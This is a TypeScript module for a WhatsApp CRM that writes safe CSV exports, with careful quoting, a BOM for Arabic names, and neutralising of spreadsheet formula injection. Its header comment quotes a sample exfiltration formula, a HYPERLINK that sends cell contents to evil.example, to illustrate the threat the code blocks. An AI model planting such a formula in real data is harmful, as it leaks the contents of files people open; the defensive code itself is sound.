/**
 * Building a CSV that a spreadsheet opens correctly and safely.
 *
 * ============================================================
 * WHY THIS IS NOT `rows.map((r) => r.join(","))`
 * ============================================================
 *
 * Two separate problems, and the second is a security one.
 *
 * THE OBVIOUS ONE is quoting. A customer called "Ahmed, Sons & Co" or a message
 * containing a newline breaks a naive join, and the damage is silent: the file
 * opens, the columns shift, and every row after it is wrong in a way that looks
 * like data rather than like corruption.
 *
 * THE ONE THAT MATTERS MORE is formula injection. Excel, LibreOffice and Google
 * Sheets all evaluate a cell whose text begins with `=`, `+`, `-`, `@`, or a
 * tab or carriage return. Every cell in these exports carries text a CUSTOMER
 * typed -- their name, their WhatsApp message -- so anybody who can message
 * this platform can put a formula in a file the business will later open.
 *
 *   =HYPERLINK("https://evil.example/?d="&A1&A2, "Click for invoice")
 *
 * That is a real attack against a real WhatsApp CRM, and the export is the
 * exact door it comes through. Every such cell is prefixed with an apostrophe,
 * which spreadsheets read as "this is text" and do not display.
 *
 * The apostrophe is added rather than the character stripped, deliberately: a
 * message that genuinely began with a minus sign should still read that way to
 * a person, and silently editing a customer's own words to make a file safe is
 * a worse trade than a leading quote nobody sees.
 */

/** Characters that make a spreadsheet treat a cell as a formula. */
const FORMULA_STARTS = ["=", "+", "-", "@", "\t", "\r"];

/**
 * One cell, quoted and made inert.
 *
 * Null and undefined become an empty cell rather than the strings "null" or
 * "undefined", which is what `String(value)` would produce and what somebody
 * would then have to explain to whoever opened the file.
 */
export function csvCell(value: unknown): string {
  if (value === null || value === undefined) return "";

  let text =
    value instanceof Date
      ? value.toISOString()
      : typeof value === "object"
        ? JSON.stringify(value)
        : String(value);

  if (FORMULA_STARTS.some((start) => text.startsWith(start))) {
    text = `'${text}`;
  }

  // Quote whenever the text could be misread, and double any quote inside it,
  // which is how RFC 4180 escapes one.
  if (/[",\n\r]/.test(text)) {
    return `"${text.replace(/"/g, '""')}"`;
  }
  return text;
}

/**
 * A whole file: a header row, then the rows, CRLF-separated.
 *
 * CRLF rather than LF because RFC 4180 says so and because Excel on Windows --
 * which is what the businesses on this platform use -- is the least forgiving
 * reader of the two.
 *
 * The BOM is the other half of that. Without it Excel reads a UTF-8 file as the
 * system codepage, and every Arabic name in it arrives as mojibake. This
 * platform answers in Arabic, so that is not an edge case here.
 */
export function toCsv(
  headers: readonly string[],
  rows: ReadonlyArray<ReadonlyArray<unknown>>
): string {
  const lines = [headers.map(csvCell).join(",")];
  for (const row of rows) {
    lines.push(row.map(csvCell).join(","));
  }
  return `﻿${lines.join("\r\n")}\r\n`;
}

/**
 * A filename a browser will accept and a person can recognise later.
 *
 * Dated, because an export is a snapshot and a folder full of `customers.csv`
 * tells nobody which is which. Sanitised, because the business name reaches
 * this and a slash in it would be read as a path.
 */
export function csvFilename(business: string, dataset: string, on: Date): string {
  const safe = (part: string) => part.replace(/[^a-z0-9-]+/gi, "-").replace(/^-|-$/g, "").toLowerCase();
  return `${safe(business)}-${safe(dataset)}-${on.toISOString().slice(0, 10)}.csv`;
}
